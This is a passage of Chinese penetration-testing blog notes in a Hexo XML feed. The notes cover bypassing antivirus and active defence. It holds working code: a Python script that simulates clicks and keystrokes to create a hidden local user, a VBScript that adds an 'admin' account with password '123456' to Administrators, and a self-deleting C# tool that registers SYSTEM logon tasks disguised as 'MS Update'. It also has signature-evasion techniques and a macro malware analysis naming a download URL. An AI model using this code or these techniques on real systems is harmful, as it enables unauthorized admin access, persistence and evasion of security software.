(FAILED(hRet)){break;}SysFreeString(dispParams.rgvarg-&gt;bstrVal);delete dispParams.rgvarg;CoUninitialize();} while (false);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-san/</url>
      
        <content type="html"><![CDATA[<p>一种基于行为模拟的理论绕过所有杀毒软件添加管理用户的手法研究</p><p>360 安全狗 D盾实测通过</p><p><a href="https://xz.aliyun.com/t/4078">https://xz.aliyun.com/t/4078</a></p><p>0x01 About<br>嗯 这是一个企图Uninstall All AVs失败的产物</p><p>基本思路是模拟点击 输入</p><p>通过下面指令可运行360的卸载程序</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656297139054/173e09c9908d4770a6f3788baa91ce71.png" alt="image.png"></p><p>这程序的按钮有两个ShadowEdge保护</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656297139054/e0624ef8c4c04a5db6486cc19e55fbb5.png" alt="image.png"></p><p>直接运行py脚本取点击会被拒绝</p><p>新建一个bat再用start来启动就可以绕过了</p><pre class="line-numbers language-none"><code class="language-none">http://v.youku.com/v_show/id_XNDA1NzEyMzkyMA==.html?spm=a2h3j.8428770.3416059.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如视频所示 模拟点击处最终确认按钮后无法点击</p><p>查阅资料得知这尼玛是360SPTools.exe设了很多阻碍 搞一天没突破</p><p>回念一想 不如直接添加用户 才有了本文</p><p>0x02 server<br>为了方便修改调整 采用Python做了本次任务的 不是每个目标上都有py的环境 所以手动配置咯</p><p>直接上传或使用下面脚本下载Python的embeddable版本到服务器（脚本不支持https 改半天实在没办法 需到Py官网下载后再上传到http的服务器上 带解压）</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/TheKingOfDuck/BypassAVAddUsers/blob/master/download.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#-*-coding:utf-8-*-# coding=utf-8import sysimport osimport timeimport win32guiimport win32apiimport win32conos.system("net user")#输出MMCMainFrame的窗口名称MMCMainFrame = win32gui.FindWindow("MMCMainFrame", None)# print("#######################")titlename = (win32gui.GetWindowText(MMCMainFrame))# print(titlename)# print("#######################")hWndChildList = []a = win32gui.EnumChildWindows(MMCMainFrame, lambda hWnd, param: param.append(MMCMainFrame),  hWndChildList)# print(a)#获取窗口左上角和右下角坐标a, b, c, d = win32gui.GetWindowRect(MMCMainFrame)# print(a, b, c, d)#计算窗口的长和宽 方便后面计算比例# h = c - a # print(h)# w = d - b# print(w)# 计算得出MMCMainFrame窗口的顶边距离“用户”这个标签120个坐标点 该值除非调动 否则不变# userPosH = 237 -117# print(userPosL)# userPosL = 120#计算得出MMCMainFrame窗口的坐标边距离“用户”这个标签120个坐标点 该值除非调动 否则不变# userPosH = 1145 - 915# print(userPosH)# userPosH = 230userPOS = (a + 230, b + 120 )# print(userPOS)#左键双击用户标签win32api.SetCursorPos((a + 230, b + 120))win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,a + 230, b + 120,0,0)win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,a + 230, b + 120,0,0)win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,a + 230, b + 120,0,0)win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,a + 230, b + 120,0,0)#右键单击Administrator标签下50左右 弹出新建用户窗口win32api.SetCursorPos((a + 230, b + 170))win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN,a + 230, b + 170,0,0)win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP,a + 230, b + 170,0,0)#左键单击新用户标签win32api.SetCursorPos((a + 240, b + 180))win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,a + 240, b + 180,0,0)win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,a + 240, b + 180,0,0)def inputCoolCat():  win32api.keybd_event(0x43,0,0,0)  win32api.keybd_event(0x43,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4F,0,0,0)  win32api.keybd_event(0x4F,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4F,0,0,0)  win32api.keybd_event(0x4F,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4C,0,0,0)  win32api.keybd_event(0x4C,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x43,0,0,0)  win32api.keybd_event(0x43,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x41,0,0,0)  win32api.keybd_event(0x41,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x54,0,0,0)  win32api.keybd_event(0x54,0,win32con.KEYEVENTF_KEYUP,0)  time.sleep(0.01)  #coolcat  win32api.keybd_event(9,0,0,0)def inputPassword():  win32api.keybd_event(0x43,0,0,0)  win32api.keybd_event(0x43,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4F,0,0,0)  win32api.keybd_event(0x4F,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4F,0,0,0)  win32api.keybd_event(0x4F,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x4C,0,0,0)  win32api.keybd_event(0x4C,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x43,0,0,0)  win32api.keybd_event(0x43,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x41,0,0,0)  win32api.keybd_event(0x41,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x54,0,0,0)  win32api.keybd_event(0x54,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x60,0,0,0)  win32api.keybd_event(0x60,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x61,0,0,0)  win32api.keybd_event(0x61,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0x62,0,0,0)  win32api.keybd_event(0x62,0,win32con.KEYEVENTF_KEYUP,0)  win32api.keybd_event(0xBE,0,0,0)  win32api.keybd_event(0xBE,0,win32con.KEYEVENTF_KEYUP,0)  #coolcat012.  time.sleep(0.01)  win32api.keybd_event(9,0,0,0)#输入用户名inputCoolCat()#输入全名inputCoolCat()#输入描述inputCoolCat()#输入密码inputPassword()#确认密码inputPassword()#发送回车键win32api.keybd_event(0x0D,0,0,0)win32api.keybd_event(0x0D,0,win32con.KEYEVENTF_KEYUP,0)#发送ESC键win32api.keybd_event(0x1B,0,0,0) win32api.keybd_event(0x1B,0,win32con.KEYEVENTF_KEYUP,0)#发送Alt + F键win32api.keybd_event(0x12,0,0,0) win32api.keybd_event(0x46,0,0,0) win32api.keybd_event(0x12,0,win32con.KEYEVENTF_KEYUP,0)win32api.keybd_event(0x46,0,win32con.KEYEVENTF_KEYUP,0) #发送X键win32api.keybd_event(0x58,0,0,0) win32api.keybd_event(0x58,0,win32con.KEYEVENTF_KEYUP,0) os.system("net user")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="ByPass主动防御干货（一）"><a href="#ByPass主动防御干货（一）" class="headerlink" title="ByPass主动防御干货（一）"></a>ByPass主动防御干货（一）</h2><p>讲了这么多，下面我们在谈谈这次Bypass360的过程吧，后面会逐渐在Gitee和Github上面开源一些项目，多了不行，少了也不好，毕竟总有人会说三道四，牛头不对马嘴。就算是放出了R3下的方法，也总会有人拿着为啥360会报毒，毕竟他连行为拦截和静态查杀都分不清，又会有多少人会去用它的代码呢？除开浏览次数多的，少的也是能行的，比如我在谷歌上找的一点东西。</p><p>这段代码通过系统计划任务来绕过主动防御，这个行为目前是被允许的，并没有在拦截规则里（仅限于这段代码的方法）。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655863318096/2f150caeef894f38b9306e58ae73d059.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">set wsnetwork=CreateObject("WSCRIPT.NETWORK")os="WinNT://"&amp;wsnetwork.ComputerNameSet ob=GetObject(os)Set oe=GetObject(os&amp;"/Administrators,group")Set od=ob.Create("user","admin")od.SetPassword "123456"od.SetInfoSet of=GetObject(os&amp;"/admin",user)oe.add os&amp;"/admin"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">using Microsoft.Win32.TaskScheduler;using System;using System.Diagnostics;using System.IO;namespace TaskSchedulerWrapper{    class Program    {        static void Main(string[] args)        {            logo();            string taskname = null;            string parameter = null;            string path = null;            if (args.Length &gt; 0)            {                foreach (var arg in args)                {                    string userQue = arg.Split('=')[0].Trim();                    string userAns = arg.Split('=')[1].Trim();                    switch (userQue)                    {                        case "--taskname":                            taskname = userAns;                            break;                        case "--arg":                            parameter = userAns;                            break;                        case "--path":                            path = userAns;                            break;                    }                }                if (path != null &amp;&amp; taskname != null)                {                    path = Path.GetFullPath(path);                    if (File.Exists(path) == true)                    {                        if (!GetExists(taskname))                        {                            Console.WriteLine("任务计划不存在，正在添加...");                            CreateTask(path, taskname, parameter);                            Console.WriteLine("添加完毕，正在验证是否存在...");                            if (GetExists(taskname))                            {                                Console.WriteLine("验证成功，退出线程。");                            }                            else                            {                                Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");                            }                        }                        else                        {                            Console.WriteLine("计划任务已存在，尝试删除计划任务...");                            DeleteTask(taskname);                            if (GetExists(taskname))                            {                                Console.WriteLine("删除失败，退出线程。");                            }                            else                            {                                Console.WriteLine("删除成功，正在添加...");                                CreateTask(path, taskname, parameter);                                Console.WriteLine("添加完毕，正在验证是否存在...");                                if (GetExists(taskname))                                {                                    Console.WriteLine("验证成功，退出线程。");                                }                                else                                {                                    Console.WriteLine("验证失败，可能被杀毒拦截，退出线程。");                                }                            }                        }                        killMe();                    }                    else                    {                        Console.Write("文件不存在或路径不合法，退出线程。");                    }                }                else                {                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");                    Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");                }            }            else            {                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"Executable File\" --arg=\"Arguments\"(Optional) --taskname=\"TaskScheduler name\"");                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"cscript.exe\" --arg=\"/E:Jscript 123.js\" --taskname=\"MS Update\"");                Console.WriteLine("[*]Usage: TaskScheduler.exe --path=\"file.exe\" --taskname=\"MS Update\"");            }        }        static bool GetExists(string taskName)        {            var exists = false;            TaskService ts = new TaskService();            TaskCollection tc = ts.RootFolder.GetTasks();            if (tc.Exists(taskName))            {                exists = true;            }            return exists;        }        static void CreateTask(string Path, string taskName, string arg = "")        {            TaskService ts = new TaskService();            TaskDefinition td = ts.NewTask();            td.RegistrationInfo.Author = "WDST";            td.RegistrationInfo.Description = "";            td.Triggers.Add(new LogonTrigger { });            td.Actions.Add(new ExecAction(Path, arg, null));            td.Settings.DisallowStartIfOnBatteries = false;            td.Settings.RunOnlyIfIdle = false;            ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount).Run();        }        static void DeleteTask(string taskName)        {            TaskService ts = new TaskService();            ts.RootFolder.DeleteTask(taskName);        }        static void killMe()        {            string s = Process.GetCurrentProcess().MainModule.FileName;            Process CmdProcess = new Process();            CmdProcess.StartInfo.FileName = "cmd.exe";            CmdProcess.StartInfo.CreateNoWindow = true;            CmdProcess.StartInfo.UseShellExecute = false;            CmdProcess.StartInfo.RedirectStandardInput = true;            CmdProcess.StartInfo.RedirectStandardOutput = true;            CmdProcess.StartInfo.RedirectStandardError = true;            CmdProcess.StartInfo.Arguments = "/c ping -n 1 localhost 1&gt;nul &amp; del " + "\"" + s + "\"";            CmdProcess.Start();            CmdProcess.Close();            Process.GetCurrentProcess().Kill();        }        static void logo()        {            Console.WriteLine(@"  _____        _    ___     _           _      _         ");            Console.WriteLine(@" |_   _|_ _ __| |__/ __| __| |_  ___ __| |_  _| |___ _ _ ");            Console.WriteLine(@"   | |/ _` (_-&lt; / /\__ \/ _| ' \/ -_) _` | || | / -_) '_|");            Console.WriteLine(@"   |_|\__,_/__/_\_\|___/\__|_||_\___\__,_|\_,_|_\___|_|  ");            Console.WriteLine();        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>C++ 添加计划任务的代码：</p><p><a href="https://blog.csdn.net/liujiayu2/article/details/78237022">https://blog.csdn.net/liujiayu2/article/details/78237022</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.3-cong-si-wei-jiao-du-shang-gai-bian-mian-sha-de-ren-shi-xia/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.3-cong-si-wei-jiao-du-shang-gai-bian-mian-sha-de-ren-shi-xia/</url>
      
        <content type="html"><![CDATA[<h1 id="传统杀软检测原理（一）"><a href="#传统杀软检测原理（一）" class="headerlink" title="传统杀软检测原理（一）"></a>传统杀软检测原理（一）</h1><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a><strong>扫描技术</strong></h2><ol><li>扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。</li><li>程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。</li><li>修复技术：即是对恶意程序所损坏的文件进⾏还原</li><li>急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。</li><li>智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。</li><li>全盘扫描：扫描电脑全部磁盘，耗时较长。</li><li>勒索软件防护：保护电脑中的文件不被⿊客恶意加密。</li><li>开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序</li></ol><h2 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a><strong>监控技术</strong></h2><ol><li>内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控</li><li>读取到内存中的⽂件；监控读取到内存的⽹络数据。</li><li>文件监控：当发现写到磁盘上的⽂件中存在病毒，或者是被病毒感染，就会主动</li><li>报警。</li><li>邮件监控：当发现电⼦邮件的附件存在病毒时进⾏拦截。</li><li>网页防护：组织网络攻击和不安全下载。</li><li>行为防护：提醒用户户可疑的应用程序行为</li></ol><h1 id="传统杀软检测原理（二）"><a href="#传统杀软检测原理（二）" class="headerlink" title="传统杀软检测原理（二）"></a>传统杀软检测原理（二）</h1><ol><li>进程行行行为监测法(沙盒模式)<br>机制：通过对病毒多年年的观察、研究，有一一些行行行为是病毒的共同行行行为，而而且比比较特殊，在正常程序中，这些行行行为比比较罕 见。当程序运行行行时，监视其进程的各种行行行为，如果发现了了病毒行行行为，立立即报警。<br>优缺点：<br>1.优点：可发现未知病毒、可相当准确地预报未知的多数病毒；<br>2.缺点：可能误报警、不不能识别病毒名称、有一一定实现难度、需要更更多的用用户参与判断；</li><li>动防御技术<br>主动防御并不不需要病毒特征码支支持，只要杀毒软件能分析并扫描到目目标程序的行行行为，并根据预先设定的规则，判定是否应该进行行行清除操作主动防御本来想领先于病毒，让杀毒软件自自己己变成安全工工程师来分析病毒，从而而达到以不不变应万变的境界。但是，计算机的智能总是在一一系列列的规则下诞生生，而而普通用用户的技术水水平达不不到专业分析病毒的水水平，两者之间的博弈将主动防御推上一一个尴尬境地。</li><li>机器器学习识别技术</li><li><a href="https://bbs.pediy.com/thread-272298.htm">https://bbs.pediy.com/thread-272298.htm</a></li><li>机器器学习识别技术既可以做静态样本的二二进制分析，又又可以运用用在沙箱动态行行行为分析当中，是为内容/行行行为+算法模式。伴随着深度学习的急速发展，各家厂厂商也开始尝试运用用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二二进制恶意样本检测</li></ol><h1 id="从特征码角度去测试杀软的逻辑（一）"><a href="#从特征码角度去测试杀软的逻辑（一）" class="headerlink" title="从特征码角度去测试杀软的逻辑（一）"></a>从特征码角度去测试杀软的逻辑（一）</h1><ol><li><p>常见的特征码定位工具有CCL、MYCCL。工具大致原理就是分割文件，某些分割部分填入数据(0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之前局别是使用的分割算法不同，查找特征码的效果不同。</p><blockquote><p>目前比较常有名气的特征码定位器主要有CCL与MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p></blockquote><p>后来出来了一款新的特征码定位软件 <code>VirTest</code>。下面是作者自己的介绍：</p><blockquote><p>我们可以这样假设报毒过程，如果检测文件是PE,如果在CODE位置存在 标志A,在DATA位置存在标志B,在资源位置存在标志C,同时满足这个3个条件，那么杀软就会报毒,VIRTEST工作原理就是要找到引起报毒最后一个标志，也就是假设中的标志C。</p></blockquote><blockquote><p>因此VIRTEST采用2分排除法，测试标志C所在文件中的位置，由于被杀的文件可能存在多个 类似于ABC这样的连锁条件，所以我们必须要通过一种排除机制，先要找最靠近文件前部的连锁条件，排除掉文件尾部数据，当找到第一个连锁条件后，抹掉引标志C，再恢复尾部数据，</p></blockquote><blockquote><p>然后继续测试另外的连锁条件，直到找到最后一个连锁条件，抹掉后，整个文件免杀了，则说明特征代码被定为完毕了，所以VIRTEST绝对可以精确的定位出所有的复合特征。这比文件分块定位法先进得多，更为科学。</p></blockquote><p>工具查找肯定是针对二进制文件（有源码的也编译后在检查）。<br>具体用过MYCCL（使用方法自行查找），确实比手工分割文件定位方便，也可以找到某些文件的特征码，但是有些时候可能会出现非常多非常多…的被杀文件分割</p></li></ol><h1 id="从特征码角度去测试杀软的逻辑（二）"><a href="#从特征码角度去测试杀软的逻辑（二）" class="headerlink" title="从特征码角度去测试杀软的逻辑（二）"></a>从特征码角度去测试杀软的逻辑（二）</h1><ol><li><strong>数据</strong><br>   如果特征码定位到数据（通过IDA/OD等确认），其实不好修改，稍微不慎就会导致程序不能运行，或者影响程序运行流程或结果。</li><li>字符串，如果不影响程序逻辑，可以替换大小写；如果无关紧要的数据，随意替换；等等，看情况而定。</li><li>整数，如果不影响结果，替换值，清零等等操作。</li><li>地址，基本应该不能修改，具体看情况。</li><li>PE头数据，根据PE结构具体来看，无用数据清零或修改，有用数据看情况修改。</li></ol><p>反正特征码定位到数据位置不容易修改（可以再试试后面的盲免杀）。</p><ol><li><strong>代码</strong></li><li>如果特征码定位到代码（也通过IDA/OD等确认），在不改变程序功能基础上，应用各种方法修改。</li><li>等价替换汇编代码，如mov eax，0可以换成xor eax，eax，直接结果相同，二进制代码不同。</li><li>交换代码顺序，在不影响逻辑的情况下。</li><li>代码块移位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址。<br>6、</li><li>最后，终极修改方法，找到访问数据的代码，直接修改代码访问数据的地址，数据也可以放到其他地址了，其实就如同修改源码一样修改，肯定没有修改源码那么容易（见后）。</li></ol><h2 id="源码免杀的逻辑原理（一）"><a href="#源码免杀的逻辑原理（一）" class="headerlink" title="源码免杀的逻辑原理（一）"></a>源码免杀的逻辑原理（一）</h2><ol><li>这里说的是针对有源码的（二进制就别想手工了…），方法非常简单。</li><li>mian中屏蔽所有代码，编译，扫描。不报的话继续2，如果依然报毒，去5。</li><li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复2。直到定位到某个函数或者多个函数，进入3。</li><li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复2。</li><li>直到定位某段代码（无自定义内部调用），特征码在此。</li><li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从1开始。如果没有，那去找找PE头吧。</li><li>大致流程：</li><li><pre><code class="cpp">1. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报</code></pre><img src=""><img src=""></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-mian-sha-office-wen-dang-zhi-pyload-fen-xi-si/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-mian-sha-office-wen-dang-zhi-pyload-fen-xi-si/</url>
      
        <content type="html"><![CDATA[<h2 id="1-29-免杀Office文档之pyload分析（四）"><a href="#1-29-免杀Office文档之pyload分析（四）" class="headerlink" title="1.29 免杀Office文档之pyload分析（四）"></a>1.29 免杀Office文档之pyload分析（四）</h2><p>样本通过下载回来的10.doc执行插入的Excel恶意宏代码，恶意宏代码进而下载执行多个窃密木马，相关分析如下：</p><p>执行宏代码<br>10.doc内嵌的Excel文档对象被插入了10个恶意宏对象，这样会反复弹框要求用户允许执行宏，稍不注意可能就会中招：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706477011/84e5d5ab39724c899e584a342f444813.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706477011/3d29351b09784d0ba164184915c2e329.png" alt="image.png"></p><p>恶意宏代码被执行后首先会下载执行hxxp://0-day.us/img/10.vbs脚本：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706477011/e74a0e6ec521489794d2e03115b5c841.png" alt="image.png"></p><p>并创建一个计划任务每分钟执行一次下载回来的VBS脚本：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655706477011/b22189d5c66144e7bca8c1ea21808961.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-wen-dang-diao-yu-zhi-ru-he-kuai-su-jin-xing-hong-mian-sha-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-wen-dang-diao-yu-zhi-ru-he-kuai-su-jin-xing-hong-mian-sha-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="Office文档钓鱼之如何快速进行宏免杀"><a href="#Office文档钓鱼之如何快速进行宏免杀" class="headerlink" title="Office文档钓鱼之如何快速进行宏免杀"></a>Office文档钓鱼之如何快速进行宏免杀</h2><p>概述<br>360威胁情报中心曾在2018年2月发布了《2017中国高级持续性威胁（APT）研究报告》，报告指出利用Office漏洞、宏、DDE等相关技术进行APT攻击一直是APT组织的重要手段，整个2017年，先后有多个高危的Office漏洞以及相关利用技术被曝出，其中很大一部分已经被APT组织所使用。将Office作为攻击载体显然已经成为APT组织的首选。</p><p>360威胁情报中心自然会对Office相关的漏洞和利用技术重点关注并做持续跟踪，而在近日，基于威胁情报中心的数据，我们捕获到了一批利用多个Office OLE特性绕过杀软检测并执行宏代码的样本。和大多数的样本一样，这批样本最终会使用Office中的宏代码下载执行相关的远控/窃密软件，而通过我们的关联分析，幕后团伙疑似为ProjectM。</p><p>样本分析<br>由于这类攻击样本在此前极少出现，所以相关杀软对这类样本的检出率还不够理想，以我们接下来分析的攻击样本在VirusTotal上的查杀情况来看，59家杀毒软件仅有3家能够检测查杀：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655693032078/f074c254b7aa42b492452a464cfda51f.png" alt="image.png"></p><p>样本执行过程<br>样本原始文件名为：Rigging in Pakistan Senate.doc（在巴基斯坦参议院索赔.doc），文档打开后会诱导用户允许文档编辑以触发OLE2Link，进而下载执行带有宏的Excel文档：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655693032078/0d6ad8f445464ee8a18e165e607d3fe2.png" alt="image.png"></p><p>诱导执行带有恶意宏的Excel文档：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1655693032078/73c0c6de34284c3390d034c73147fced.png" alt="image.png"></p><p>用户一旦单击“启用宏”，恶意宏代码则会继续下载执行窃密木马长期控制用户电脑，整个样本执行流程如下：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-cha-ru-excel.sheetmacroenabled-dui-xiang-mian-sha-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.29-office-cha-ru-excel.sheetmacroenabled-dui-xiang-mian-sha-san/</url>
      
